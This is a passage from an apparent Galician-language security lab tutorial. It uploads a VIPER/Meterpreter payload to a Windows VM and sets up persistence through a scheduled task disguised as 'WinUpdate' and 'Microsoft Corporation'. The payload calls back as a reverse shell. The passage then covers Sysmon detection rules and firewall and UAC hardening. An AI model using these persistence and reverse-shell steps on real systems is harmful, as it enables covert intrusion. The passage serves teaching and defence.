    *   Configura `LHOST` coa IP do servidor VIPER (192.168.120.100) e `LPORT` 6666.  
    *   Elixe o formato do payload: SourceCode Bypass exe
<center>![Fig. Payload](images/payload1.png){width=50%}</center>
-->

<ul>
<li>No Dashboard de VIPER, vai á sección de <code>Handler&amp;Payload</code>.  </li>
<li>Na sección de <code>Generate Payload</code>, selecciona o handler creado.  </li>
<li>Elixe o formato do payload (p.ex., <code>elf</code> para Linux, <code>exe</code> para Windows).  </li>
<li>Descarga o payload xerado.    </li>
<li>Premer en Generate Payload para descargar o payload xerado.</li>
</ul>
<p><img alt="Fig. Generate Payload" src="../images/payload0_0.png" />
<img alt="Fig. Generate Payload" src="../images/payload0_1.png" width="30%" /></p>
<p><img alt="Fig. Generate Payload" src="../images/payload0_2.png" width="50%" /></p>
<h5 id="paso-5-subir-o-payload-a-vm-3-e-crear-unha-tarefa-programada-na-vitimavm-3">Paso 5: Subir o payload a VM-3 e crear unha tarefa programada na vítima(VM-3)</h5>
<p>Copiar no contedor docker de viper o payload en /tmp
<div class="language-bash highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="c1"># docker cp /home/usuario/Descargas/1744925454.exe viper-c:/tmp</span>
</span></code></pre></div></p>
<p>Abrir na GUI unha consola dende a conexión establecida no porto 5555</p>
<p><img alt="Fig. Paso 5" src="../images/payload0_3.png" /></p>
<p>Sube o ficheiro ao equipo vítima Windows
<div class="language-bash highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>meterpreter&gt;<span class="w"> </span>upload<span class="w"> </span>/tmp/1744925454.exe<span class="w"> </span>C:<span class="se">\\</span>Users<span class="se">\\</span>usuario<span class="se">\\</span>
</span></code></pre></div></p>
<p><img alt="Fig. Paso 5" src="../images/payload0_4.png" /></p>
<p>Para garantir que unha tarefa programada se execute mesmo cando o equipo está en batería, é recomendable creala usando un ficheiro XML personalizado con configuracións avanzadas.</p>
<ul>
<li>Crear un ficheiro <code>task.xml</code> co seguinte contido</li>
</ul>
<p>execute -f cmd.exe -a '/c wmic useraccount where name="usuario" get sid &gt; C:\Windows\Temp\sidinfo.txt'
cat C:\Windows\Temp\sidinfo.txt</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;</span>
</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a><span class="s1">&lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;</span>
</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a><span class="s1">  &lt;RegistrationInfo&gt;</span>
</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a><span class="s1">    &lt;Description&gt;Execución persistente con batería permitida&lt;/Description&gt;</span>
</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a><span class="s1">    &lt;Author&gt;Microsoft Corporation&lt;/Author&gt;</span>
</span><span id="__span-77-6"><a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a><span class="s1">  &lt;/RegistrationInfo&gt;</span>
</span><span id="__span-77-7"><a id="__codelineno-77-7" name="__codelineno-77-7" href="#__codelineno-77-7"></a><span class="s1">  &lt;Triggers&gt;</span>
</span><span id="__span-77-8"><a id="__codelineno-77-8" name="__codelineno-77-8" href="#__codelineno-77-8"></a><span class="s1">    &lt;LogonTrigger&gt;</span>
</span><span id="__span-77-9"><a id="__codelineno-77-9" name="__codelineno-77-9" href="#__codelineno-77-9"></a><span class="s1">      &lt;Enabled&gt;true&lt;/Enabled&gt;</span>
</span><span id="__span-77-10"><a id="__codelineno-77-10" name="__codelineno-77-10" href="#__codelineno-77-10"></a><span class="s1">    &lt;/LogonTrigger&gt;</span>
</span><span id="__span-77-11"><a id="__codelineno-77-11" name="__codelineno-77-11" href="#__codelineno-77-11"></a><span class="s1">  &lt;/Triggers&gt;</span>
</span><span id="__span-77-12"><a id="__codelineno-77-12" name="__codelineno-77-12" href="#__codelineno-77-12"></a><span class="s1">  &lt;Principals&gt;</span>
</span><span id="__span-77-13"><a id="__codelineno-77-13" name="__codelineno-77-13" href="#__codelineno-77-13"></a><span class="s1">    &lt;Principal id=&quot;Author&quot;&gt;</span>
</span><span id="__span-77-14"><a id="__codelineno-77-14" name="__codelineno-77-14" href="#__codelineno-77-14"></a><span class="s1">      &lt;UserId&gt;S-1-5-21-2901123646-3497879057-3457833120-1001&lt;/UserId&gt;</span>
</span><span id="__span-77-15"><a id="__codelineno-77-15" name="__codelineno-77-15" href="#__codelineno-77-15"></a><span class="s1">      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;</span>
</span><span id="__span-77-16"><a id="__codelineno-77-16" name="__codelineno-77-16" href="#__codelineno-77-16"></a><span class="s1">      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;</span>
</span><span id="__span-77-17"><a id="__codelineno-77-17" name="__codelineno-77-17" href="#__codelineno-77-17"></a><span class="s1">    &lt;/Principal&gt;</span>
</span><span id="__span-77-18"><a id="__codelineno-77-18" name="__codelineno-77-18" href="#__codelineno-77-18"></a><span class="s1">  &lt;/Principals&gt;</span>
</span><span id="__span-77-19"><a id="__codelineno-77-19" name="__codelineno-77-19" href="#__codelineno-77-19"></a><span class="s1">  &lt;Settings&gt;</span>
</span><span id="__span-77-20"><a id="__codelineno-77-20" name="__codelineno-77-20" href="#__codelineno-77-20"></a><span class="s1">    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;</span>
</span><span id="__span-77-21"><a id="__codelineno-77-21" name="__codelineno-77-21" href="#__codelineno-77-21"></a><span class="s1">    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;</span>
</span><span id="__span-77-22"><a id="__codelineno-77-22" name="__codelineno-77-22" href="#__codelineno-77-22"></a><span class="s1">    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;</span>
</span><span id="__span-77-23"><a id="__codelineno-77-23" name="__codelineno-77-23" href="#__codelineno-77-23"></a><span class="s1">    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;</span>
</span><span id="__span-77-24"><a id="__codelineno-77-24" name="__codelineno-77-24" href="#__codelineno-77-24"></a><span class="s1">    &lt;Enabled&gt;true&lt;/Enabled&gt;</span>
</span><span id="__span-77-25"><a id="__codelineno-77-25" name="__codelineno-77-25" href="#__codelineno-77-25"></a><span class="s1">    &lt;Hidden&gt;false&lt;/Hidden&gt;</span>
</span><span id="__span-77-26"><a id="__codelineno-77-26" name="__codelineno-77-26" href="#__codelineno-77-26"></a><span class="s1">  &lt;/Settings&gt;</span>
</span><span id="__span-77-27"><a id="__codelineno-77-27" name="__codelineno-77-27" href="#__codelineno-77-27"></a><span class="s1">  &lt;Actions Context=&quot;Author&quot;&gt;</span>
</span><span id="__span-77-28"><a id="__codelineno-77-28" name="__codelineno-77-28" href="#__codelineno-77-28"></a><span class="s1">    &lt;Exec&gt;</span>
</span><span id="__span-77-29"><a id="__codelineno-77-29" name="__codelineno-77-29" href="#__codelineno-77-29"></a><span class="s1">      &lt;Command&gt;C:\Windows\Temp\shell.exe&lt;/Command&gt;</span>
</span><span id="__span-77-30"><a id="__codelineno-77-30" name="__codelineno-77-30" href="#__codelineno-77-30"></a><span class="s1">    &lt;/Exec&gt;</span>
</span><span id="__span-77-31"><a id="__codelineno-77-31" name="__codelineno-77-31" href="#__codelineno-77-31"></a><span class="s1">  &lt;/Actions&gt;</span>
</span><span id="__span-77-32"><a id="__codelineno-77-32" name="__codelineno-77-32" href="#__codelineno-77-32"></a><span class="s1">&lt;/Task&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/home/usuario/Descargas/task.xml
</span></code></pre></div>
<ul>
<li>Subir mediante <code>upload</code> dende <code>meterpreter</code> o ficheiro <code>task.xml</code> a <code>C:\Users\usuario\task.xml</code>. Previamente debemos copiar ese ficheiro a contedor docker de viper:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="c1"># docker cp /home/usuario/Descargas/task.xml viper-c:/tmp</span>
</span></code></pre></div></li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>meterpreter&gt;<span class="w"> </span>upload<span class="w"> </span>/tmp/task.xml<span class="w"> </span>C:<span class="se">\\</span>Users<span class="se">\\</span>usuario<span class="se">\\</span>
</span></code></pre></div>
<p><img alt="Fig. Paso 5" src="../images/payload0_5.png" /></p>
<ul>
<li>Crear a tarefa programada a partir do ficheiro</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>execute -f powershell.exe -a &quot;-Command schtasks /create /tn &#39;WinUpdate&#39; /xml C:\Users\usuario\task.xml&quot;
</span></code></pre></div>
<p><img alt="Fig. Paso 6" src="../images/execute1.png" />
<img alt="Fig. Paso 6" src="../images/execute2.png" /></p>
<p>Esta tarefa:<br />
- Executarase ao login<br />
- Con privilexios elevados<br />
- Mesmo con batería<br />
- Chamará ao ficheiro <code>payload.exe</code> especificado  </p>
<h5 id="paso-6-probar-ou-agardar-reconexion">Paso 6: Probar ou agardar reconexión</h5>
<p>Probar na sesión actual executando a tarefa programada:
<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>execute -f powershell.exe -a &quot;-Command schtasks /run /tn &#39;WinUpdate&#39;&quot;
</span></code></pre></div></p>
<p><img alt="Fig. Paso 6" src="../images/execute3.png" />
<img alt="Fig. Paso 6" src="../images/execute4.png" /></p>
<p>ou reiniciar e a sesión será recibida no handler tras login do usuario:
<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>shutdown /r /t 0
</span></code></pre></div>
<img alt="Fig. Paso 6" src="../images/execute5.png" />
<img alt="Fig. Paso 6" src="../images/payload0_6.png" /></p>
<hr />
<h4 id="resumo"><strong>Resumo</strong></h4>
<ol>
<li><strong><code>VM-2</code> (Debian) foi comprometida cun payload (<code>Meterpreter</code>).</strong></li>
<li><strong>Realizouse Movemento Lateral dende <code>VM-2</code> cara <code>VM-3</code> sen empregar Pivoting, usando credenciais válidas (<code>usuario/abc123</code>).</strong></li>
<li><strong>Obtívose acceso a <code>VM-3</code> mediante <code>psexec</code>.</strong></li>
<li><strong>Conseguiuse persistencia mediante a subida dun payload e a creación dunha tarefa programada.</strong></li>
</ol>
<hr />
<div class="admonition tip">
<p class="admonition-title"><strong>Movemento Lateral vs. Pivoting</strong></p>
<ul>
<li><strong><code>Movemento Lateral</code></strong> é a técnica de moverse dun sistema a outro dentro da mesma rede comprometida sen utilizar ningún tipo de proxy ou túnel.</li>
<li><strong><code>Pivoting</code></strong> implica crear un proxy ou túnel para acceder a redes que non son directamente accesibles.</li>
</ul>
<p><strong>Neste caso só se realizou Movemento Lateral, non Pivoting.</strong></p>
</div>
<hr />
<h4 id="monitorizacion-do-movemento-lateral-desde-vm-2-a-vm-3">Monitorización do Movemento Lateral desde VM-2 a VM-3</h4>
<p><strong>Detección de conexións sospeitosas en VM-3 (Windows 10)</strong></p>
<ul>
<li>
<p>Uso de <code>netstat</code> para listar as conexións activas e escoitando:</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>netstat -ano | findstr ESTAB
</span></code></pre></div>
<img alt="Fig. netstat" src="../images/cmd1.png" /></p>
</li>
<li>
<p>Identificar procesos asociados a conexións abertas con <code>tasklist</code>:</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>tasklist /FI &quot;PID eq &lt;PID&gt;&quot;
</span></code></pre></div>
<img alt="Fig. tasklist" src="../images/cmd2.png" /></p>
</li>
<li>
<p>Monitorización con <code>Sysmon</code>:</p>
<div class="admonition warning">
<p class="admonition-title">Ficheiros a descargar</p>
<p><em>Para poder descargar as ferramentas necesarias é preciso copiar estas ferramentas en VM-3, ou darlle conexión a Internet a VM-3.</em> </p>
</div>
<p><strong>Sysmon</strong> (System Monitor) é unha ferramenta de Microsoft Sysinternals que permite <strong>rexistrar eventos de seguridade avanzados en sistemas Windows</strong>, como execucións de procesos, modificacións de rexistro, conexións de rede, etc.</p>
<p><strong>Instalación:</strong></p>
<ol>
<li>
<p>Descarga desde a páxina oficial:<br />
<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon</a></p>
</li>
<li>
<p>Instala cun ficheiro de configuración personalizado:</p>
<p>O ficheiro <code>config.xml</code> contén as regras que definen que eventos se rexistran. Podes usar unha configuración xa feita (como a de SwiftOnSecurity) ou crear a túa.
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">usuario</span><span class="p">\</span><span class="n">Sysmon</span><span class="p">&gt;</span> <span class="nb">iwr </span><span class="s2">&quot;https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;config.xml&quot;</span>
</span></code></pre></div></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>sysmon -accepteula -i config.xml
</span></code></pre></div>
<p><img alt="Fig. sysmon" src="../images/sysmon1.png" /></p>
</li>
<li>
<p>Sysmon e o Visor de Eventos</p>
<p>Podes visualizar os eventos de Sysmon usando a interface gráfica de Windows:</p>
<p>A. Abre o <strong>Event Viewer</strong> (preme <code>Win + R</code>, escribe <code>eventvwr</code> e preme Enter).<br />
 B. No panel esquerdo, navega a:<br />
<strong>Visor de eventos → Registros de aplicacións e servizos → Microsoft → Windows → Sysmon → Operational</strong>
 <img alt="Fig. sysmon" src="../images/sysmon2.png" /></p>
<p>Podes aplicar filtros ou gardar vistas personalizadas para centrarte en tipos concretos de eventos, como execución de procesos, cambios en rexistro, ou tráfico de rede sospeitoso.</p>
</li>
<li>
<p>Visualizar movemento lateral con Sysmon no Visor de Eventos</p>
<p>Eventos clave que delatan movemento lateral:</p>
<table>
<thead>
<tr>
<th>Evento Sysmon</th>
<th>Descrición</th>
<th>Indicio de movemento lateral</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1</code></td>
<td>Creación de proceso</td>
<td>Execución de <code>psexec.exe</code>, <code>cmd.exe</code>, <code>schtasks.exe</code>, <code>payload.exe</code></td>
</tr>
<tr>
<td><code>3</code></td>
<td>Conexión de rede</td>
<td>Conexións a portos <code>445</code>, <code>135</code>, <code>5555</code>, <code>6666</code></td>
</tr>
<tr>
<td><code>11</code></td>
<td>Acceso a ficheiros</td>
<td>Copia ou execución en <code>Temp</code>, <code>AppData</code>, etc.</td>
</tr>
<tr>
<td><code>13</code>, <code>14</code></td>
<td>Cambios no rexistro</td>
<td>Rexistro de execucións automáticas (<code>Run</code>, <code>RunOnce</code>)</td>
</tr>
</tbody>
</table>
<p>Exemplo 1: Detectar reconexión con VIPER</p>
<ol>
<li>Abre o Visor de Eventos</li>
<li>Vai a <code>Sysmon &gt; Operational</code></li>
<li>
<p>Buscar por: </p>
<ul>
<li>Porto de conexión a VIPER: 6666 → Evento <code>3</code><br />
<img alt="Fig. sysmon" src="../images/sysmon-exemplo1-1.png" />  </li>
<li>Conexión de saída a <code>192.168.120.100</code> (VIPER) → Evento <code>3</code><br />
<img alt="Fig. sysmon" src="../images/sysmon-exemplo1-2.png" /> </li>
<li>Execución de <code>payload.exe</code> → Eventos <code>1</code> e <code>3</code><br />
<img alt="Fig. sysmon" src="../images/sysmon-exemplo1-3.png" /><br />
<img alt="Fig. sysmon" src="../images/sysmon-exemplo1-4.png" />  </li>
</ul>
</li>
</ol>
<p>Exemplo 2: Detectar executables en execución</p>
<ol>
<li>Abre o Visor de Eventos</li>
<li>Vai a <code>Sysmon &gt; Operational</code></li>
<li>
<p>Buscar por: </p>
<ul>
<li>Executables <code>.exe</code> → Evento <code>1</code><br />
<img alt="Fig. sysmon" src="../images/sysmon-exemplo2-1.png" />  </li>
</ul>
</li>
</ol>
<p>Exemplo 3: Execución de tarefa programada con persistencia</p>
<div class="admonition note">
<p class="admonition-title">Detectar execución de tarefas programadas con Sysmon</p>
<p>Para detectar cando se executa <code>schtasks.exe</code>, podes engadir unha regra personalizada no ficheiro <code>config.xml</code> de Sysmon.</p>
<p><strong>Regra engadida</strong></p>
<p>Esta regra debe incluírse no ficheiro <code>config.xml</code> dentro dunha nova sección <code>ProcessCreate onmatch="include"</code>, despois da regra actual <code>onmatch="exclude"</code>:</p>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="cm">&lt;!-- Custom rule: Detect execución de tarefas programadas --&gt;</span>
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a><span class="nt">&lt;ProcessCreate</span><span class="w"> </span><span class="na">onmatch=</span><span class="s">&quot;include&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a><span class="w">  </span><span class="nt">&lt;Image</span><span class="w"> </span><span class="na">condition=</span><span class="s">&quot;end with&quot;</span><span class="nt">&gt;</span>schtasks.exe<span class="nt">&lt;/Image&gt;</span>
</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4" href="#__codelineno-87-4"></a><span class="nt">&lt;/ProcessCreate&gt;</span>
</span></code></pre></div>
<p><strong>Aplicar a nova configuración en Sysmon</strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="n">sysmon</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">config</span><span class="p">.</span><span class="n">xml</span>
</span></code></pre></div>
<p>A partir dese momento, cada execución de <code>schtasks.exe</code> aparecerá como evento ID <strong>1 (ProcessCreate)</strong> no log <code>Microsoft-Windows-Sysmon/Operational</code>. Así, eliminamos a tarefa programada e xeramos de novo a tarefa programada, polo que ambas accións serán rexistradas en sysmon.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>schtasks /delete /tn &quot;WinUpdate&quot; /f
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>schtasks /create /tn &quot;WinUpdate&quot; /xml C:\Users\usuario\task.xml
</span></code></pre></div>
<div class="admonition warning">
<p class="admonition-title">Execución de tarefas programadas</p>
<p>Se provocamos un reinicio como comando <code>shutdown /r /t 0</code> para que ao iniciar sesión co usuario execútese a tarefa programada esta acción non será "capturada" por <code>sysmon</code> xa que <code>schtasks.es</code> soamente dispara eventos na eliminación/creación de tarefas e non na execución destas.</p>
</div>
</div>
<p>Isto é útil para identificar persistencia baseada en tarefas programadas no contexto dun movemento lateral ou post-explotación.</p>
<ol>
<li>Abre o Visor de Eventos</li>
<li>Vai a <code>Sysmon &gt; Operational</code></li>
<li>
<p>Buscar por: </p>
<ul>
<li>
<p>schtasks → Evento <code>1</code><br />
<img alt="Fig. sysmon" src="../images/sysmon-exemplo3-1.png" /><br />
<img alt="Fig. sysmon" src="../images/sysmon-exemplo3-2.png" />  </p>
</li>
<li>
<p>svchost.exe -k netsvcs -p -s Schedule → Evento <code>1</code><br />
<img alt="Fig. sysmon" src="../images/sysmon-exemplo3-3.png" />  </p>
</li>
</ul>
<p>Filtrar po ID:</p>
<ul>
<li>
<p>Evento <code>11</code>: Execución ou acceso a tarefa programada persistente
   <img alt="Fig. sysmon" src="../images/sysmon-exemplo3-4.png" />  </p>
<div class="admonition tip">
<p class="admonition-title">Eventos <code>13</code>/<code>14</code> para entradas no rexistro (Run key)</p>
</div>
</li>
</ul>
</li>
</ol>
</li>
</ol>
</li>
<li>
<p><strong>Uso de wevtutil para consultar eventos</strong></p>
<p><strong><code>wevtutil</code></strong> é unha ferramenta de liña de comandos integrada en Windows que permite <strong>consultar, exportar e xestionar logs de eventos</strong> do sistema.
 <code>wevtutil</code> xa vén preinstalado en todas as versións modernas de Windows, non é necesario instalar nada adicional.</p>
<p>Para consultar os eventos de Sysmon directamente:</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>wevtutil qe Microsoft-Windows-Sysmon/Operational /rd:true /f:text | more
</span></code></pre></div>
 <img alt="Fig. wevtutil" src="../images/wevtutil-1.png" /></p>
<p>Para exportar os eventos a un ficheiro <code>.evtx</code>:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>wevtutil epl Microsoft-Windows-Sysmon/Operational sysmon_log.evtx
</span></code></pre></div>
</li>
</ul>
<h4 id="bastionado-e-mitigacion-da-vm-3-windows-10">Bastionado e mitigación da VM-3 (Windows 10)</h4>
<div class="admonition warning">
<p class="admonition-title">Activar UAC e Firewall en Windows (modo produción)</p>
<p>Para contornas de proba ou laboratorio, anteriormente, desactivamos o UAC e o firewall de Windows 10. Para a contorna de produción deberiamos activalos cos seguintes comandos. <strong>Executa o terminal como administrador.</strong></p>
<p><strong>Activar UAC (User Account Control):</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v EnableLUA /t REG_DWORD /d 1 /f
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>shutdown /r /t 0
</span></code></pre></div>
<p>Isto modifica o rexistro para activar completamente o UAC. Requírese <strong>reinicio</strong>.</p>
<p><strong>Activar o firewall en todos os perfís (dominio, privado, público):</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>netsh advfirewall set allprofiles state on
</span></code></pre></div>
<p>Isto activa o firewall de Windows para todos os perfís. Útil para asegurar o bloqueo <code>SMB</code>, <code>psexec</code>, ou conexións remotas.</p>
<hr />
<p><strong>Nota:</strong> Estes cambios aumentan significativamente a seguridade do sistema. Úsaos sempre, a non ser, que queiras traballar sen estas medidas de seguridade en contornas de laboratorio ou máquinas illadas.</p>
</div>
<h5 id="configuracion-de-firewall-para-bloquear-movemento-lateral"><strong>Configuración de Firewall para bloquear movemento lateral</strong></h5>
<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>netsh advfirewall set allprofiles state on
</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>netsh advfirewall firewall add rule name=&quot;Block Lateral Movement&quot; protocol=TCP dir=IN localport=445,135,139 action=block
</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>netsh advfirewall firewall add rule name=&quot;Block Lateral Movement&quot; protocol=TCP dir=OUT localport=445,135,139 action=block
</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a>netsh advfirewall show allprofiles
</span></code></pre></div>
<div class="admonition info">
<p class="admonition-title"><em>Comprobando en VM-1 (Viper)</em></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/psexec<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Started<span class="w"> </span>reverse<span class="w"> </span>TCP<span class="w"> </span>handler<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.120.100:5555<span class="w"> </span>
</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="m">192</span>.168.120.102:445<span class="w"> </span>-<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>server...
</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span><span class="m">192</span>.168.120.102:445<span class="w"> </span>-<span class="w"> </span>Exploit<span class="w"> </span>failed<span class="w"> </span><span class="o">[</span>unreachable<span class="o">]</span>:<span class="w"> </span>Rex::ConnectionTimeout<span class="w"> </span>The<span class="w"> </span>connection<span class="w"> </span>with<span class="w"> </span><span class="o">(</span><span class="m">192</span>.168.120.102:445<span class="o">)</span><span class="w"> </span>timed<span class="w"> </span>out.
</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Exploit<span class="w"> </span>completed,<span class="w"> </span>but<span class="w"> </span>no<span class="w"> </span>session<span class="w"> </span>was<span class="w"> </span>created.
</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a><span class="w"> </span>msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/psexec<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>
</span></code></pre></div>
</div>
<h5 id="hardenizacion-de-servizos-windows"><strong>Hardenización de Servizos Windows</strong></h5>
<ul>
<li><strong>Desactivar SMBv1 (protocolo obsoleto e vulnerable):</strong>
     <div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>sc.exe config lanmanworkstation depend= bowser/mrxsmb20/nsi
</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a>dism /online /disable-feature /featurename:SMB1Protocol
</span></code></pre></div></li>
<li>
<p><strong>Desactivar completamente o acceso por Escritorio Remoto (RDP) ao sistema:</strong>
     <div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 1 /f
</span></code></pre></div></p>
</li>
<li>
<p><strong>Activar Control de Contas de Usuario (UAC):</strong> <br />
<em>Requírese</em> <strong><em>reinicio</em></strong><br />
     <div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v EnableLUA /t REG_DWORD /d 1 /f
</span></code></pre></div>
     E para garantir que o sistema sempre mostre o aviso UAC ao usuario, aínda que o usuario sexa <code>administrador</code>, requirindo confirmación manual para evitar execucións automáticas ou ocultas con privilexios:
     <div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f
</span></code></pre></div></p>
</li>
</ul>
<div class="admonition tip">
<p class="admonition-title">Panel de control\Sistema y seguridad\Seguridad y mantenimiento</p>
<ul>
<li>Panel de control\Sistema y seguridad\Seguridad y mantenimiento\Cambiar la configuración de Seguridad y mantenimiento<br />
<img alt="Fig. Cambiar la configuración de Seguridad y mantenimiento" src="../images/uac-1.png" width="75%" /></li>
<li>Cambiar configuración de Control de cuentas de usuario<br />
<img alt="Fig. Cambiar configuración de Control de cuentas de usuario" src="../images/uac-2.png" width="75%" /><br />
<img alt="Fig. Cambiar configuración de Control de cuentas de usuario" src="../images/uac-3.png" width="40%" /><br />
<img alt="Fig. Cambiar configuración de Control de cuentas de usuario" src="../images/uac-4.png" width="75%" /></li>
</ul>
</div>
<div class="admonition info">
<p class="admonition-title"><em>Comprobando en VM-1 (Viper) tras reiniciar VM-3</em></p>
<p>Agora non se crea a <code>Reverse Shell: meterpreter</code> a través do porto TCP 6666</p>
</div>
